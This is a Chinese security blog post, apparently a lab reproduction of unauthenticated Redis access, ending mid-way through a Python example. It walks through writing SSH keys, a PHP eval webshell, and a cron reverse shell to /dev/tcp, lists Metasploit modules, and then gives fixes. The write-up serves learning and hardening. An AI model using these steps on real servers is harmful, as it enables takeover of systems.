<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="RoboTerh"><meta name="copyright" content="RoboTerh"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>Redis未授权访问漏洞复现 | RoboTerh</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.25/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"roboterh.github.io","root":"/","title":["ROBO","TERH","BLOG","小站"],"version":"1.7.0","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><script>CONFIG.leancloudVisitors = {"enable":true,"app_id":"QzEMTRDcJM476WmFbFsyqtOV-MdYXbMMI","app_key":"Ovrs8D1mvkchhDyViQ6oVoQq","server_url":"https://roboterh.github.io"}</script><script defer src="/js/analytics/leancloud-visitors.js"></script><meta name="description" content="Redis未授权漏洞成因 redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网 没有设置密码认证（一般为空），可以免密码远程登录redis服务。  搭建漏洞环境 centos7 : 靶机  kali ：攻击机   使用yum命令安装redis 查看安装的redis: find &#x2F; -name &quot;redis*&amp;quot">
<meta property="og:type" content="article">
<meta property="og:title" content="Redis未授权访问漏洞复现">
<meta property="og:url" content="https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/index.html">
<meta property="og:site_name" content="RoboTerh">
<meta property="og:description" content="Redis未授权漏洞成因 redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网 没有设置密码认证（一般为空），可以免密码远程登录redis服务。  搭建漏洞环境 centos7 : 靶机  kali ：攻击机   使用yum命令安装redis 查看安装的redis: find &#x2F; -name &quot;redis*&amp;quot">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/image-20220609153702613.png">
<meta property="og:image" content="https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/image-20220609163841684.png">
<meta property="og:image" content="https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/image-20220609164126022.png">
<meta property="og:image" content="https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/image-20220609165217569.png">
<meta property="og:image" content="https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/image-20220609165548283.png">
<meta property="og:image" content="https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/image-20220609170358119.png">
<meta property="og:image" content="https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/image-20220609171149793.png">
<meta property="og:image" content="https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/image-20220609172624207.png">
<meta property="og:image" content="https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/image-20220609172853189.png">
<meta property="og:image" content="https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/image-20220609172928142.png">
<meta property="og:image" content="https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/image-20220609182809087.png">
<meta property="og:image" content="https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/image-20220609192857059.png">
<meta property="og:image" content="https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/image-20220609193602386.png">
<meta property="og:image" content="https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/image-20220609194656032.png">
<meta property="og:image" content="https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/image-20220609194722702.png">
<meta property="og:image" content="https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/image-20220609195441054.png">
<meta property="og:image" content="https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/image-20220625194420993.png">
<meta property="og:image" content="https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/image-20220625194502872.png">
<meta property="article:published_time" content="2022-06-09T04:38:41.000Z">
<meta property="article:modified_time" content="2022-06-26T11:49:55.809Z">
<meta property="article:author" content="RoboTerh">
<meta property="article:tag" content="Redis漏洞">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/image-20220609153702613.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="RoboTerh"><img width="96" loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/8@XK~G6IIG(3~I6J~C6M4JB.png" alt="RoboTerh"><span class="site-author-status" title="wwww我好菜">-_-</span></a><div class="site-author-name"><a href="/about/">RoboTerh</a></div><span class="site-name">RoboTerh</span><sub class="site-subtitle"></sub><div class="site-desciption">无聊的时候记录记录自己的学习啊</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">50</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">16</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">36</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/F0A770ED0C75BC233DA1034B4C80E8DA.png" title="QQ" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2865153524@qq.com" title="E-Mail" target="_blank" style="color:8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">1.</span> <span class="toc-text">Redis未授权漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">搭建漏洞环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="toc-number">3.1.</span> <span class="toc-text">远程连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E5%86%99%E5%85%A5ssh%E5%85%AC%E9%92%A5"><span class="toc-number">3.2.</span> <span class="toc-text">redis写入ssh公钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell"><span class="toc-number">3.3.</span> <span class="toc-text">写入webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.4.</span> <span class="toc-text">使用定时任务反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8MSF%E5%AE%8C%E6%88%90%E6%93%8D%E4%BD%9C"><span class="toc-number">3.5.</span> <span class="toc-text">使用MSF完成操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">4.</span> <span class="toc-text">修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B"><span class="toc-number">5.</span> <span class="toc-text">实例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%EF%BC%884-x-5-x%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">Redis主从复制（4.x, 5.x）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">6.1.</span> <span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8"><span class="toc-number">6.1.1.</span> <span class="toc-text">作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">6.1.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4"><span class="toc-number">6.1.3.</span> <span class="toc-text">命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">6.2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-1"><span class="toc-number">6.3.</span> <span class="toc-text">利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D-1"><span class="toc-number">6.4.</span> <span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">7.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://RoboTerh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="RoboTerh"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="RoboTerh"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Redis未授权访问漏洞复现</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2022-06-09 12:38:41" itemprop="dateCreated datePublished" datetime="2022-06-09T12:38:41+08:00">2022-06-09</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <time title="Modified: 2022-06-26 19:49:55" itemprop="dateModified" datetime="2022-06-26T19:49:55+08:00">2022-06-26</time></div><span class="leancloud_visitors" id="/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/" data-flag-title="Redis未授权访问漏洞复现"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Views"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">漏洞复现</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/Redis%E6%BC%8F%E6%B4%9E/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Redis漏洞</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h2 id="Redis未授权漏洞成因"><a href="#Redis未授权漏洞成因" class="headerlink" title="Redis未授权漏洞成因"></a>Redis未授权漏洞成因</h2><ul>
<li>redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网</li>
<li>没有设置密码认证（一般为空），可以免密码远程登录redis服务。</li>
</ul>
<h2 id="搭建漏洞环境"><a href="#搭建漏洞环境" class="headerlink" title="搭建漏洞环境"></a>搭建漏洞环境</h2><ul>
<li><p>centos7 : 靶机</p>
</li>
<li><p>kali ：攻击机</p>
</li>
</ul>
<p>使用yum命令安装redis</p>
<p>查看安装的<code>redis</code>: <code>find / -name &quot;redis*&quot;</code></p>
<p>修改<code>redis.conf</code>文件构建漏洞环境</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#bind 127.0.0.1  //注释这条</span>
protected-mode no    //非保护模式
daemonize <span class="token function">yes</span>    //进程守护，后台运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>开启服务 <code>redis-server /etc/redis.conf</code></p>
<p>redis常用命令：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> testkey <span class="token string">"Hello World"</span>         <span class="token comment"># 设置键testkey的值为字符串Hello World</span>
get testkey                       <span class="token comment"># 获取键testkey的内容</span>
SET score <span class="token number">99</span>                      <span class="token comment"># 设置键score的值为99</span>
INCR score                        <span class="token comment"># 使用INCR命令将score的值增加1</span>
GET score                         <span class="token comment"># 获取键score的内容</span>
keys *                            <span class="token comment"># 列出当前数据库中所有的键</span>
get anotherkey                    <span class="token comment"># 获取一个不存在的键的值</span>
config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /home/test         <span class="token comment"># 设置工作目录</span>
config <span class="token builtin class-name">set</span> dbfilename redis.rdb   <span class="token comment"># 设置备份文件名</span>
config get <span class="token function">dir</span>                    <span class="token comment"># 检查工作目录是否设置成功</span>
config get dbfilename             <span class="token comment"># 检查备份文件名是否设置成功</span>
save                              <span class="token comment"># 进行一次备份操作</span>
flushall 删除所有数据
del key 删除键为key的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h3><p>在攻击机中 <code>redis-cli -h ip</code>进行连接</p>
<p><img src="image-20220609153702613.png" alt="image-20220609153702613" loading="lazy"></p>
<p>如果存在密码验证，因为这个是一个轻量级的认证，可以使用hydra或者mfs爆破</p>
<p><strong>不需校验直接就可以连接redis,存在Redis未授权访问漏洞。</strong></p>
<h3 id="redis写入ssh公钥"><a href="#redis写入ssh公钥" class="headerlink" title="redis写入ssh公钥"></a>redis写入ssh公钥</h3><p>原理：利用了redis数据库的备份功能，当redis以root身份运行，利用Redis的config set命令，只要内容为SSH公钥内容，文件路径满足公钥存放的位置，就可以给root账户写入SSH公钥文件，直接通过SSH登录目标<a target="_blank" rel="noopener" href="https://cloud.tencent.com/product/cvm?from=10680">服务器</a></p>
<ol>
<li><p>在靶机中创建<code>/root/.ssh</code>目录(一般机器上面存在这个目录)</p>
</li>
<li><p>在攻击机上面生成密钥对<code>ssh-keygen -t rsa</code> 在本机的<code>/root/.ssh/</code>目录下生成了<code>id_rsa / id_rsa.pub</code>文件</p>
</li>
<li><p>将<code>id_rsa.pub</code>里面存放的公钥转存入<code>1.txt</code>中</p>
</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>echo -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span> <span class="token function">cat</span> id_rsa.pub<span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span>.txt

<span class="token comment"># -e的解释</span>
<span class="token function">man</span> <span class="token builtin class-name">echo</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"\-e"</span>
<span class="token comment"># 可以知道他支持转义</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="image-20220609163841684.png" alt="image-20220609163841684" loading="lazy"></p>
<ol start="4">
<li>将公钥写入<code>远程redis</code>中</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> <span class="token number">1</span>.txt <span class="token operator">|</span> redis-cli -h <span class="token number">192.168</span>.153.138 -x <span class="token builtin class-name">set</span> payload

<span class="token comment"># -x 支持stdin标准输入</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>远程登陆<code>redis</code></p>
<p><img src="image-20220609164126022.png" alt="image-20220609164126022" loading="lazy"></p>
<p>这里也可以证明我们上一步的步骤有效，写入了键为<code>payload</code>， 值为公钥的键值对</p>
<ol start="5">
<li>通过<code>config set dir</code> 和 <code>config set dbfilename</code>分别设置工作目录和存放文件</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 设置工作目录为 /root/.ssh</span>
config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /root/.ssh
<span class="token comment"># 创建文件 authorized_keys</span>
config <span class="token builtin class-name">set</span> dbfilename <span class="token string">"authorized_keys"</span>
<span class="token comment"># 保存信息入文件</span>
save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="image-20220609165217569.png" alt="image-20220609165217569" loading="lazy"></p>
<p>成功写入了文件</p>
<ol start="6">
<li>最后就可以ssh连接靶机了</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -i id_rsa root@ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="image-20220609165548283.png" alt="image-20220609165548283" loading="lazy"></p>
<p>成功连接</p>
<h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><ol>
<li><p>在靶机中搭建一个简单的web服务</p>
<p>选用php语言 <code>php -S ip:port</code></p>
</li>
</ol>
<p><img src="image-20220609170358119.png" alt="image-20220609170358119" loading="lazy"></p>
<p>很明显，web服务搭建好了</p>
<ol start="2">
<li>设置<code>redis</code>工作目录在web root下，并写入shell</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">192.168</span>.153.138:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /tmp
OK
<span class="token number">192.168</span>.153.138:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> <span class="token builtin class-name">set</span> payload <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>&lt;?php @eval(<span class="token variable">$_POST</span>['redis']);?><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>
OK
<span class="token number">192.168</span>.153.138:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> config <span class="token builtin class-name">set</span> dbfilename shell.php
OK
<span class="token number">192.168</span>.153.138:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> save
OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="image-20220609171149793.png" alt="image-20220609171149793" loading="lazy"></p>
<p>成功拿到shell</p>
<h3 id="使用定时任务反弹shell"><a href="#使用定时任务反弹shell" class="headerlink" title="使用定时任务反弹shell"></a>使用定时任务反弹shell</h3><p>linux定时任务介绍</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/var/spool/cron/ 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名
/etc/crontab 这个文件负责调度各种管理和维护任务。
/etc/cron.d/ 这个目录用来存放任何要执行的crontab文件或脚本。
我们还可以把脚本放在/etc/cron.hourly、/etc/cron.daily、/etc/cron.weekly、/etc/cron.monthly目录中，让它每小时/天/星期、月执行一次。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>注意： 在不同系统中，root的位置是不一样的 在kali和ubantu中，其文件位置为<code>/var/spool/cron/crontabs/root</code>，在centos系列中位置为<code>/var/spool/cron/root</code>，通常情况下没有root文件，需要自己创建。</p>
<p>远程连接redis操作</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">192.168</span>.153.138:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron
OK
<span class="token number">192.168</span>.153.138:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> config <span class="token builtin class-name">set</span> dbfilename root
OK
<span class="token number">192.168</span>.153.138:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> <span class="token builtin class-name">set</span> xxx <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>* * * * * bash -i >&amp; /dev/tcp/192.168.153.135/8000 0>&amp;1<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>
OK
<span class="token number">192.168</span>.153.138:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> save
OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="image-20220609172624207.png" alt="image-20220609172624207" loading="lazy"></p>
<p>成功写入</p>
<p><img src="image-20220609172853189.png" alt="image-20220609172853189" loading="lazy"></p>
<p>查看日志，定时任务也成功启用</p>
<p><img src="image-20220609172928142.png" alt="image-20220609172928142" loading="lazy"></p>
<p>shell反弹也成功</p>
<h3 id="使用MSF完成操作"><a href="#使用MSF完成操作" class="headerlink" title="使用MSF完成操作"></a>使用MSF完成操作</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole
search redis<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auxiliary/scanner/redis/file_upload<span class="token punctuation">(</span>文件上传模块<span class="token punctuation">)</span>
auxiliary/scanner/redis/redis_login <span class="token punctuation">(</span>爆破密码模块<span class="token punctuation">)</span>
auxiliary/scanner/redis/redis_server<span class="token punctuation">(</span>验证密码模块<span class="token punctuation">)</span>
exploit/linux/redis/redis_unauth_exec<span class="token punctuation">(</span>获取shell模块<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>1、禁止外部访问Redis服务端口</p>
<p>​    <code>redis.conf</code>文件中的<code>bind 127.0.0.1</code>可以限制可以访问redis服务的ip地址</p>
<p>2、禁止使用root权限启动redis服务</p>
<p>3、配置安全组，限制可连接Redis服务器的IP</p>
<p>4、设置redis的密码</p>
<p>​    在<code>redis.conf</code>文件中的<code>requirepass yourpasswd</code>设置访问redis服务的密码，只有经过<code>auth yourpasswd</code>认证之后才可以执行命令</p>
<p><img src="image-20220609182809087.png" alt="image-20220609182809087" loading="lazy"></p>
<p>5、禁止远程使用危险命令如flushall、config、eval，或修改命令的名称</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>使用 python反序列化 + redis未授权 getshell</p>
<p><code>code_vuln.py</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> redis
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request<span class="token punctuation">,</span>session
<span class="token keyword">import</span> pickle
<span class="token keyword">import</span> random
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span> <span class="token comment">#需要安装flask,pip install flask</span>
<span class="token keyword">class</span> <span class="token class-name">Redis</span><span class="token punctuation">:</span> <span class="token comment">#定义Redis类，类中有三个方法，connect()方法负责连接redis数据库。注意IP和端口</span>
    <span class="token decorator annotation punctuation">@staticmethod</span>
    <span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        r <span class="token operator">=</span> redis<span class="token punctuation">.</span>StrictRedis<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span> db<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> r
    <span class="token decorator annotation punctuation">@staticmethod</span>
